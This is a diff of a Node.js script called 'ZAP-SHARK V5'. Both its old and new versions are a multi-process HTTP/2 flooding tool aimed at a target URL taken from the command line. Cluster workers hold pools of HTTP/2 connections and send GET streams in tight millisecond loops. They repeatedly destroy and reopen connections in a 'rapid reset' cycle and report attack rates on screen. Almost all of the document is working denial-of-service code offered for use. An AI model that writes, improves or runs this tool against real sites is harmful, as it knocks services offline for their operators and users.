@@ -1,306 +1,274 @@
 const http2 = require('http2');
-const os = require('os');
 const cluster = require('cluster');
-const { exec } = require('child_process');
+const os = require('os');
 
-// ==================== MASTER PROCESS ====================
-if (cluster.isMaster) {
-    console.log('=== ZAP-SHARK V5 - MULTI-PROCESS CLUSTER ===');
-    console.log('Target:', process.argv[2] || 'https://target.com');
-    console.log('CPU Cores:', os.cpus().length);
-    console.log('='.repeat(60));
-    
-    // BYPASS JS MEMORY LIMITS (NO ROOT NEEDED)
-    process.env.UV_THREADPOOL_SIZE = 128;
-    process.setMaxListeners(0);
-    
-    // CREATE WORKER FOR EACH CPU CORE
-    const numWorkers = Math.max(4, os.cpus().length);
-    console.log(`[+] Launching ${numWorkers} attack workers`);
-    
-    // SHARED MEMORY FOR STATS
-    const sharedStats = {
-        totalRequests: 0,
-        currentRPS: 0,
-        peakRPS: 0,
-        startTime: Date.now(),
-        activeWorkers: 0
-    };
-    
-    // CREATE WORKERS
-    for (let i = 0; i < numWorkers; i++) {
-        setTimeout(() => {
+class ZAPSHARK_V5 {
+    constructor(targetUrl) {
+        this.targetUrl = targetUrl;
+        this.hostname = new URL(targetUrl).hostname;
+        this.status = "ATTACKING";
+        this.totalRequests = 0;
+        this.currentRPS = 0;
+        this.startTime = Date.now();
+        this.requestsSinceLastCalc = 0;
+        this.lastRpsCalc = Date.now();
+        this.workers = [];
+        this.workerCount = 12;
+        this.rapidReset = 450;
+    }
+
+    // === WORKER CREATION ===
+    createWorker(id) {
+        return new Promise((resolve) => {
             const worker = cluster.fork({
-                WORKER_ID: i,
-                TARGET_URL: process.argv[2]
+                WORKER_ID: id,
+                TARGET_URL: this.targetUrl,
+                HOSTNAME: this.hostname,
+                RAPID_RESET: this.rapidReset
             });
-            
+
             worker.on('message', (msg) => {
                 if (msg.type === 'stats') {
-                    sharedStats.totalRequests += msg.requests;
-                    sharedStats.currentRPS += msg.rps;
-                    sharedStats.peakRPS = Math.max(sharedStats.peakRPS, sharedStats.currentRPS);
-                    sharedStats.activeWorkers++;
+                    this.totalRequests += msg.requests || 0;
+                    this.requestsSinceLastCalc += msg.rpsDelta || 0;
+                }
+                if (msg.type === 'ready') {
+                    this.workers.push(worker);
+                    resolve();
                 }
             });
-        }, i * 100); // Stagger worker starts
+
+            worker.on('exit', () => {
+                setTimeout(() => this.createWorker(id), 1000);
+            });
+        });
     }
-    
-    // DISPLAY CONTROLLER
-    let lastDisplayUpdate = Date.now();
-    const displayInterval = setInterval(() => {
-        const runtime = Math.floor((Date.now() - sharedStats.startTime) / 1000);
+
+    // === STATS ===
+    calculateRPS() {
+        const now = Date.now();
+        const timeDiff = (now - this.lastRpsCalc) / 1000;
+        
+        if (timeDiff >= 0.9) {
+            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
+            this.requestsSinceLastCalc = 0;
+            this.lastRpsCalc = now;
+        }
+    }
+
+    formatRuntime() {
+        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
         const hours = Math.floor(runtime / 3600);
         const minutes = Math.floor((runtime % 3600) / 60);
         const seconds = runtime % 60;
-        const runtimeStr = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-        
-        const workersAlive = Object.keys(cluster.workers || {}).length;
-        const memoryUsed = Math.round(process.memoryUsage().rss / 1024 / 1024);
+        return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+    }
+
+    // === DISPLAY ===
+    updateDisplay() {
+        this.calculateRPS();
         
         process.stdout.write('\x1B[2J\x1B[0f');
-        console.log(`=== ZAP-SHARK V5 MASTER ===`);
-        console.log(`RUNTIME: ${runtimeStr} | WORKERS: ${workersAlive}/${numWorkers} | MEM: ${memoryUsed}MB`);
-        console.log('='.repeat(60));
-        console.log(`TOTAL REQUESTS: ${sharedStats.totalRequests.toLocaleString()}`);
-        console.log(`COMBINED RPS: ${sharedStats.currentRPS.toFixed(1)} | PEAK: ${sharedStats.peakRPS.toFixed(1)}`);
-        console.log(`REQ/SEC PER WORKER: ${(sharedStats.currentRPS / workersAlive || 1).toFixed(1)}`);
-        console.log('='.repeat(60));
-        console.log('WORKER STATUS:');
-        
-        // Reset for next calculation
-        sharedStats.currentRPS = 0;
-        sharedStats.activeWorkers = 0;
-        
-        lastDisplayUpdate = Date.now();
-    }, 1000);
-    
-    // AUTO-RESTART DEAD WORKERS
-    cluster.on('exit', (worker, code, signal) => {
-        console.log(`[!] Worker ${worker.id} died, restarting...`);
-        setTimeout(() => {
-            const newWorker = cluster.fork({
-                WORKER_ID: worker.id,
-                TARGET_URL: process.argv[2]
-            });
-        }, 1000);
-    });
-    
-    // CLEANUP ON EXIT
-    process.on('SIGINT', () => {
-        clearInterval(displayInterval);
-        console.log('\n\n=== FINAL CLUSTER STATS ===');
-        console.log(`Total Requests: ${sharedStats.totalRequests.toLocaleString()}`);
-        console.log(`Peak Combined RPS: ${sharedStats.peakRPS.toFixed(1)}`);
-        console.log(`Runtime: ${Math.floor((Date.now() - sharedStats.startTime) / 1000)}s`);
+        console.log('ZAP-SHARK V5 | TØR');
         console.log('='.repeat(40));
-        
-        for (const id in cluster.workers) {
-            cluster.workers[id].kill();
-        }
-        process.exit(0);
-    });
-    
-} else {
-// ==================== WORKER PROCESS ====================
-const WORKER_ID = parseInt(process.env.WORKER_ID);
-const TARGET_URL = process.env.TARGET_URL || 'https://example.com';
+        console.log(`RUNTIME: ${this.formatRuntime()} | STATUS: ${this.status}`);
+        console.log(`WORKERS: ${this.workers.length}/${this.workerCount} | RESET: ${this.rapidReset}ms`);
+        console.log('='.repeat(40));
+        console.log(`TRS-SHARK — ${this.totalRequests.toLocaleString()}`);
+        console.log(`RPS-SHARK — ${this.currentRPS.toFixed(1)}`);
+        console.log('='.repeat(40));
+    }
 
-class V5Worker {
-    constructor() {
-        this.targetUrl = TARGET_URL;
-        this.hostname = new URL(TARGET_URL).hostname;
-        this.workerId = WORKER_ID;
-        this.totalRequests = 0;
-        this.currentRPS = 0;
-        this.requestsSinceLastCalc = 0;
-        this.lastRpsCalc = Date.now();
-        this.running = true;
-        
-        // VIP RAPID RESET - 500ms
-        this.connectionPool = [];
-        this.maxConnections = 8;
-        this.lastConnectionReset = Date.now();
-        this.resetInterval = 490; // VIP 500ms RAPID RESET
-        
-        // MEMORY BYPASS TECHNIQUES
-        this.preAllocatedRequests = 1000;
-        this.requestBuffer = [];
-        this.zeroMemoryMode = true;
-        
-        // WORKER-SPECIFIC PAYLOAD
-        this.payloadSignature = `SHARK-V5-W${this.workerId}-${Date.now()}`;
-        
-        this.init();
-    }
-    
-    init() {
-        console.log(`[Worker ${this.workerId}] Initializing attack...`);
-        
-        // PRE-ALLOCATE REQUEST OBJECTS (MEMORY BYPASS)
-        for (let i = 0; i < this.preAllocatedRequests; i++) {
-            this.requestBuffer.push({
-                headers: {
-                    ':method': 'GET',
-                    ':path': `/?w=${this.workerId}&t=${Date.now()}`,
-                    ':authority': this.hostname,
-                    'user-agent': `ZAP-SHARK-V5/${this.workerId}`,
-                    'x-shark-id': this.payloadSignature
-                }
+    // === MAIN ===
+    async start() {
+        console.log('=== ZAP-SHARK V5 | TØR ===');
+        console.log('Workers: 12 | Conns: 144 | Rapid Reset: 450ms');
+        console.log('Target:', this.targetUrl);
+        console.log('='.repeat(50));
+
+        if (cluster.isMaster) {
+            // CREATE WORKERS
+            for (let i = 0; i < this.workerCount; i++) {
+                await this.createWorker(i);
+                await new Promise(resolve => setTimeout(resolve, 100));
+            }
+
+            // DISPLAY LOOP
+            setInterval(() => {
+                this.updateDisplay();
+            }, 100);
+
+            // BROADCAST CONTROLS
+            process.on('SIGINT', () => {
+                console.log('\n=== STOPPING V5 ===');
+                this.workers.forEach(w => w.kill());
+                process.exit(0);
             });
-        }
-        
-        // BUILD CONNECTION POOL
-        this.buildConnectionPool();
-        
-        // START ATTACK
-        setTimeout(() => this.startAttack(), 1000);
-        
-        // START STATS REPORTING
-        setInterval(() => this.reportStats(), 1000);
-    }
-    
-    // BUILD OPTIMIZED CONNECTION POOL
-    buildConnectionPool() {
-        for (let i = 0; i < this.maxConnections; i++) {
-            this.createConnection();
+
+        } else {
+            // === WORKER CODE ===
+            const WorkerZAPSHARK = require('./worker-shark.js');
+            const worker = new WorkerZAPSHARK(
+                process.env.TARGET_URL,
+                process.env.HOSTNAME,
+                parseInt(process.env.RAPID_RESET),
+                parseInt(process.env.WORKER_ID)
+            );
+            worker.start();
         }
     }
-    
+}
+
+// WORKER MODULE (save as worker-shark.js)
+class WorkerZAPSHARK {
+    constructor(targetUrl, hostname, rapidReset, workerId) {
+        this.targetUrl = targetUrl;
+        this.hostname = hostname;
+        this.rapidReset = rapidReset;
+        this.workerId = workerId;
+        
+        this.connectionPool = [];
+        this.connCount = 12;
+        this.totalRequests = 0;
+        this.lastReset = Date.now();
+        
+        this.running = true;
+    }
+
     createConnection() {
         try {
-            // ULTRA-LIGHT H2 CONNECTION
             const client = http2.connect(this.targetUrl, {
-                maxSessionMemory: 8192, // MINIMAL MEMORY
-                maxDeflateDynamicTableSize: 4096
+                maxSessionMemory: 4096,
+                maxDeflateDynamicTableSize: 1024
             });
-            
-            // MINIMAL EVENT LISTENERS
-            client.on('error', () => {
-                setTimeout(() => this.createConnection(), 100);
-            });
-            
-            this.connectionPool.push({
-                client,
-                created: Date.now(),
-                requestCount: 0,
-                id: Math.random().toString(36).substr(2, 5)
-            });
-            
+            client.setMaxListeners(50);
+            client.on('error', () => {});
+            return client;
         } catch (err) {
-            // SILENT RETRY
+            return null;
         }
     }
-    
-    // VIP RAPID RESET - 500ms
-    performRapidReset() {
+
+    buildPool() {
+        this.connectionPool = [];
+        for (let i = 0; i < this.connCount; i++) {
+            const conn = this.createConnection();
+            if (conn) this.connectionPool.push(conn);
+        }
+    }
+
+    rapidResetCycle() {
         const now = Date.now();
-        if (now - this.lastConnectionReset >= this.resetInterval) {
-            // RESET 40% OF CONNECTIONS EVERY 500ms
+        if (now - this.lastReset >= this.rapidReset) {
             const resetCount = Math.ceil(this.connectionPool.length * 0.4);
-            
             for (let i = 0; i < resetCount; i++) {
-                const index = Math.floor(Math.random() * this.connectionPool.length);
-                const conn = this.connectionPool[index];
-                
-                if (conn && conn.requestCount > 1000) {
-                    try {
-                        conn.client.destroy();
-                        this.createConnection();
-                        this.connectionPool.splice(index, 1);
-                    } catch (err) {}
+                const idx = Math.floor(Math.random() * this.connectionPool.length);
+                if (this.connectionPool[idx]) {
+                    try { this.connectionPool[idx].destroy(); } catch (e) {}
+                    this.connectionPool[idx] = this.createConnection();
                 }
             }
-            
-            this.lastConnectionReset = now;
+            this.lastReset = now;
         }
     }
-    
-    // MEMORY-EFFICIENT REQUEST SENDING
+
     sendRequest() {
         if (this.connectionPool.length === 0) return;
-        
-        // USE PRE-ALLOCATED REQUEST OBJECTS
-        const reqTemplate = this.requestBuffer[
-            Math.floor(Math.random() * this.requestBuffer.length)
-        ];
-        
-        // SEND MULTIPLE STREAMS PER TICK
-        const streamsThisTick = Math.min(20, this.connectionPool.length * 2);
-        
-        for (let i = 0; i < streamsThisTick; i++) {
-            const conn = this.connectionPool[
-                Math.floor(Math.random() * this.connectionPool.length)
-            ];
-            if (!conn) continue;
-            
+
+        // MAX STREAMS PER TICK
+        for (let i = 0; i < 8; i++) {
+            const client = this.connectionPool[Math.floor(Math.random() * this.connectionPool.length)];
+            if (!client) continue;
+
             try {
-                const req = conn.client.request(reqTemplate.headers);
-                conn.requestCount++;
-                
-                // ZERO-MEMORY RESPONSE HANDLING
+                const req = client.request({
+                    ':method': 'GET',
+                    ':path': '/',
+                    ':authority': this.hostname
+                });
+
                 req.on('response', () => {
                     req.destroy();
                 });
-                
+
                 req.on('error', () => {
                     req.destroy();
                 });
-                
+
                 req.on('close', () => {
                     this.totalRequests++;
-                    this.requestsSinceLastCalc++;
+                    // SEND STATS TO MASTER EVERY 100 REQS
+                    if (this.totalRequests % 100 === 0) {
+                        process.send({
+                            type: 'stats',
+                            requests: 100,
+                            rpsDelta: 100
+                        });
+                    }
                 });
-                
+
                 req.end();
-                
+
             } catch (err) {
                 this.totalRequests++;
-                this.requestsSinceLastCalc++;
             }
         }
+    }
+
+    start() {
+        this.buildPool();
         
-        // PERFORM VIP RAPID RESET
-        this.performRapidReset();
-    }
-    
-    // ATTACK LOOP
-    startAttack() {
-        // ULTRA-FAST LOOP WITH MEMORY BYPASS
-        setInterval(() => {
-            // SEND 5 BATCHES PER TICK
-            for (let i = 0; i < 5; i++) {
-                this.sendRequest();
+        // SEND READY SIGNAL
+        process.send({ type: 'ready' });
+        
+        // MAIN LOOP
+        const interval = setInterval(() => {
+            if (!this.running) {
+                clearInterval(interval);
+                return;
             }
             
-            // CALCULATE RPS
-            const now = Date.now();
-            const timeDiff = (now - this.lastRpsCalc) / 1000;
+            this.rapidResetCycle();
+            this.sendRequest();
             
-            if (timeDiff >= 0.9) {
-                this.currentRPS = this.requestsSinceLastCalc / timeDiff;
-                this.requestsSinceLastCalc = 0;
-                this.lastRpsCalc = now;
+            // REBUILD IF EMPTY
+            if (this.connectionPool.length === 0) {
+                this.buildPool();
             }
-            
-        }, 1); // 1ms INTERVAL FOR MAX SPEED
-    }
-    
-    // REPORT TO MASTER
-    reportStats() {
-        if (process.send) {
-            process.send({
-                type: 'stats',
-                workerId: this.workerId,
-                requests: this.totalRequests,
-                rps: this.currentRPS,
-                connections: this.connectionPool.length,
-                memory: Math.round(process.memoryUsage().heapUsed / 1024 / 1024)
-            });
-        }
+        }, 0.1);
+        
+        // CLEANUP
+        process.on('message', (msg) => {
+            if (msg === 'stop') {
+                this.running = false;
+                this.connectionPool.forEach(c => {
+                    try { c.destroy(); } catch (e) {}
+                });
+            }
+        });
     }
 }
 
-// START WORKER
-new V5Worker();
+// EXPORT FOR WORKER
+if (require.main === module && cluster.isWorker) {
+    const worker = new WorkerZAPSHARK(
+        process.env.TARGET_URL,
+        process.env.HOSTNAME,
+        parseInt(process.env.RAPID_RESET),
+        parseInt(process.env.WORKER_ID)
+    );
+    worker.start();
 }
+
+// MAIN EXECUTION
+const target = process.argv[2];
+if (!target || !target.startsWith('https://')) {
+    console.log('Usage: node zap-shark-v5.js https://target.com');
+    process.exit(1);
+}
+
+// INCREASE MEMORY FOR MASTER
+process.env.UV_THREADPOOL_SIZE = 128;
+
+const shark = new ZAPSHARK_V5(target);
+shark.start();
